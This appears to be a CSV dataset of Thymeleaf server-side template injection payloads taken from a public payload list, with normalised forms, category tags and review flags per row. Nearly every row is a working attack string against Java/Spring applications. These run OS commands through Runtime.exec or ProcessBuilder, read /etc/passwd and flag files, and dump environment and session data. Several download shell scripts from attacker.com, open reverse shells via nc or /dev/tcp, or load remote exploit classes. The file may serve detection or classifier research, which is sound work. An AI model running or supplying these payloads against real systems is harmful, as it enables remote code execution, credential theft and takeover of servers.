${#strings.toString(T(java.lang.Runtime).getRuntime().exec('id'))},${#strings.tostring(t(java.lang.runtime).getruntime().exec('S'))},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#request.getSession().getServletContext().getContextPath()},${#request.getsession().getservletcontext().getcontextpath()},java,Thymeleaf,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#servletContext.getServerInfo()},${#servletcontext.getserverinfo()},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#servletContext.getRealPath('/')},${#servletcontext.getrealpath('S')},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#servletContext.getInitParameterNames()},${#servletcontext.getinitparameternames()},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#httpServletRequest.getRequestURL()},${#httpservletrequest.getrequesturl()},java,Thymeleaf,1,high,uncertain,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#httpServletRequest.getRequestURI()},${#httpservletrequest.getrequesturi()},java,Thymeleaf,1,high,uncertain,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#httpServletRequest.getQueryString()},${#httpservletrequest.getquerystring()},java,Thymeleaf,1,high,uncertain,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#httpServletRequest.getRemoteAddr()},${#httpservletrequest.getremoteaddr()},java,Thymeleaf,1,high,uncertain,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#httpServletRequest.getRemoteHost()},${#httpservletrequest.getremotehost()},java,Thymeleaf,1,high,uncertain,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#httpServletRequest.getHeader('User-Agent')},${#httpservletrequest.getheader('S')},java,Thymeleaf,1,high,uncertain,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#httpServletRequest.getHeaderNames()},${#httpservletrequest.getheadernames()},java,Thymeleaf,1,high,uncertain,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#httpServletRequest.getCookies()},${#httpservletrequest.getcookies()},java,Thymeleaf,1,high,uncertain,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#httpServletRequest.getSession()},${#httpservletrequest.getsession()},java,Thymeleaf,1,high,uncertain,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#httpSession.getId()},${#httpsession.getid()},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#httpSession.getAttributeNames()},${#httpsession.getattributenames()},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))},${t(java.nio.file.files).readalllines(t(java.nio.file.paths).get('S'))},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('flag.txt'))},${t(java.nio.file.files).readalllines(t(java.nio.file.paths).get('S'))},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/etc/passwd'))},${t(java.nio.file.files).readstring(t(java.nio.file.paths).get('S'))},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('flag.txt'))},${t(java.nio.file.files).readstring(t(java.nio.file.paths).get('S'))},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.nio.file.Files).lines(T(java.nio.file.Paths).get('/etc/passwd'))},${t(java.nio.file.files).lines(t(java.nio.file.paths).get('S'))},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.nio.file.Files).list(T(java.nio.file.Paths).get('/'))},${t(java.nio.file.files).list(t(java.nio.file.paths).get('S'))},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.nio.file.Files).walk(T(java.nio.file.Paths).get('/'))},${t(java.nio.file.files).walk(t(java.nio.file.paths).get('S'))},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.io.File).new('/etc/passwd').exists()},${t(java.io.file).new('S').exists()},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.io.File('/etc/passwd').exists()},${newjava.io.file('S').exists()},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.io.File('/etc/passwd').canRead()},${newjava.io.file('S').canread()},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.io.File('/').list()},${newjava.io.file('S').list()},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.io.File('.').list()},${newjava.io.file('S').list()},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.io.File('/').listFiles()},${newjava.io.file('S').listfiles()},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('touch /tmp/pwned')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('wget http://attacker.com/shell.sh -O /tmp/shell.sh')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('curl http://attacker.com/shell.sh -o /tmp/shell.sh')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('nc attacker.com 4444 -e /bin/bash')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(javax.script.ScriptEngineManager).new().getEngineByName('JavaScript').eval('java.lang.Runtime.getRuntime().exec(""id"")')}",${t(javax.script.scriptenginemanager).new().getenginebyname('S').eval('S')},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(javax.script.ScriptEngineManager).new().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec(""id"")')}",${t(javax.script.scriptenginemanager).new().getenginebyname('S').eval('S')},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(javax.script.ScriptEngineManager).new().getEngineByName('nashorn').eval('java.lang.Runtime.getRuntime().exec(""id"")')}",${t(javax.script.scriptenginemanager).new().getenginebyname('S').eval('S')},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')},${'S'.getclass().forname('S').getruntime().exec('S')},java,Thymeleaf,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('id')},${'S'.getclass().forname('S').getmethods()[N].invoke('S'.getclass().forname('S')).exec('S')},java,Thymeleaf,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${applicationScope},${applicationscope},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${requestScope},${requestscope},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${sessionScope},${sessionscope},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${param},${param},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#ctx},${#ctx},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#vars},${#vars},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#locale},${#locale},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#request},${#request},java,Thymeleaf,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#response},${#response},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#session},${#session},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#servletContext},${#servletcontext},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
*{T(java.lang.Runtime).getRuntime().exec('id')},*{t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
*{T(java.lang.System).getProperty('user.name')},*{t(java.lang.system).getproperty('S')},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
*{new java.lang.ProcessBuilder('id').start()},*{newjava.lang.processbuilder('S').start()},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
__${new java.lang.ProcessBuilder('id').start()}__::.x,__${newjava.lang.processbuilder('S').start()}__::.x,java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('cat$IFS/etc/passwd')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','cat</etc/passwd'})}","${t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'})}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','cat<flag.txt'})}","${t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'})}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Class).forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(""var x=new java.lang.ProcessBuilder;x.command('id');x.start()"")}","${t(java.lang.class).forname('S').newinstance().getenginebyname('S').eval(""S"")}",java,Thymeleaf,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Class).forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(""java.lang.Runtime.getRuntime().exec('id')"")}","${t(java.lang.class).forname('S').newinstance().getenginebyname('S').eval(""S"")}",java,Thymeleaf,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream(),T(java.nio.charset.Charset).defaultCharset())}","${t(org.springframework.util.streamutils).copytostring(t(java.lang.runtime).getruntime().exec('S').getinputstream(),t(java.nio.charset.charset).defaultcharset())}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream(),T(java.nio.charset.Charset).defaultCharset())}","${t(org.springframework.util.streamutils).copytostring(t(java.lang.runtime).getruntime().exec('S').getinputstream(),t(java.nio.charset.charset).defaultcharset())}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream(),T(java.nio.charset.Charset).defaultCharset())}","${t(org.springframework.util.streamutils).copytostring(t(java.lang.runtime).getruntime().exec('S').getinputstream(),t(java.nio.charset.charset).defaultcharset())}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','id'}).getInputStream(),T(java.nio.charset.Charset).defaultCharset())}","${t(org.springframework.util.streamutils).copytostring(t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'}).getinputstream(),t(java.nio.charset.charset).defaultcharset())}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${@beans},${@beans},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${@systemEnvironment},${@systemenvironment},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${@applicationContext},${@applicationcontext},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(org.springframework.cglib.core.ReflectUtils).defineClass('Exploit',T(org.apache.commons.codec.binary.Base64).decodeBase64('yv66vg...'),new java.net.URLClassLoader(new java.net.URL[0])).newInstance()}","${t(org.springframework.cglib.core.reflectutils).defineclass('S',t(org.apache.commons.codec.binary.baseN).decodebaseN('S'),newjava.net.urlclassloader(newjava.net.url[N])).newinstance()}",java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.net.URLClassLoader).newInstance(T(java.net.URL).newInstance('http://attacker.com/')).loadClass('Exploit').newInstance()},${t(java.net.urlclassloader).newinstance(t(java.net.url).newinstance('S')).loadclass('S').newinstance()},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().availableProcessors()},${t(java.lang.runtime).getruntime().availableprocessors()},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().freeMemory()},${t(java.lang.runtime).getruntime().freememory()},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().totalMemory()},${t(java.lang.runtime).getruntime().totalmemory()},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().maxMemory()},${t(java.lang.runtime).getruntime().maxmemory()},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Thread).currentThread()},${t(java.lang.thread).currentthread()},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Thread).getAllStackTraces()},${t(java.lang.thread).getallstacktraces()},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.management.ManagementFactory).getRuntimeMXBean().getName()},${t(java.lang.management.managementfactory).getruntimemxbean().getname()},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.management.ManagementFactory).getRuntimeMXBean().getInputArguments()},${t(java.lang.management.managementfactory).getruntimemxbean().getinputarguments()},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.management.ManagementFactory).getRuntimeMXBean().getSystemProperties()},${t(java.lang.management.managementfactory).getruntimemxbean().getsystemproperties()},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Runtime).getRuntime().exec(T(org.apache.commons.lang3.StringUtils).join(new String[]{'sh','-c','id'},' '))}","${t(java.lang.runtime).getruntime().exec(t(org.apache.commons.langN.stringutils).join(newstring[]{'S','S','S'},'S'))}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.beans.Beans).instantiate(null,'javax.script.ScriptEngineManager').getEngineByName('JavaScript').eval('java.lang.Runtime.getRuntime().exec(""id"")')}","${t(java.beans.beans).instantiate(null,'S').getenginebyname('S').eval('S')}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')},${t(java.lang.classloader).getsystemclassloader().loadclass('S').getmethod('S').invoke(null).exec('S')},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.ProcessBuilder').getConstructor(T(String[]).class).newInstance(new String[]{'id'}).start()},${t(java.lang.classloader).getsystemclassloader().loadclass('S').getconstructor(t(string[]).class).newinstance(newstring[]{'S'}).start()},java,Thymeleaf,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Character).toString(106).concat(T(java.lang.Character).toString(97))},${t(java.lang.character).tostring(N).concat(t(java.lang.character).tostring(N))},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()).useDelimiter('\\A').next()},${newjava.util.scanner(t(java.lang.runtime).getruntime().exec('S').getinputstream()).usedelimiter('S').next()},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream()).useDelimiter('\\Z').next()},${newjava.util.scanner(t(java.lang.runtime).getruntime().exec('S').getinputstream()).usedelimiter('S').next()},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.util.Scanner(new java.io.File('flag.txt')).useDelimiter('\\Z').next()},${newjava.util.scanner(newjava.io.file('S')).usedelimiter('S').next()},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(org.apache.el.lang.ELSupport).coerceToType('id',T(java.lang.String))}","${t(org.apache.el.lang.elsupport).coercetotype('S',t(java.lang.string))}",java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.net.InetAddress).getLocalHost()},${t(java.net.inetaddress).getlocalhost()},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.net.InetAddress).getLocalHost().getHostName()},${t(java.net.inetaddress).getlocalhost().gethostname()},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.net.InetAddress).getLocalHost().getHostAddress()},${t(java.net.inetaddress).getlocalhost().gethostaddress()},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.security.AccessController).doPrivileged(new java.security.PrivilegedAction(){@Override public Object run(){try{return T(java.lang.Runtime).getRuntime().exec('id');}catch(Exception e){return null;}}})},${t(java.security.accesscontroller).doprivileged(newjava.security.privilegedaction(){@overridepublicobjectrun(){try{returnt(java.lang.runtime).getruntime().exec('S');}catch(exceptione){returnnull;}}})},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
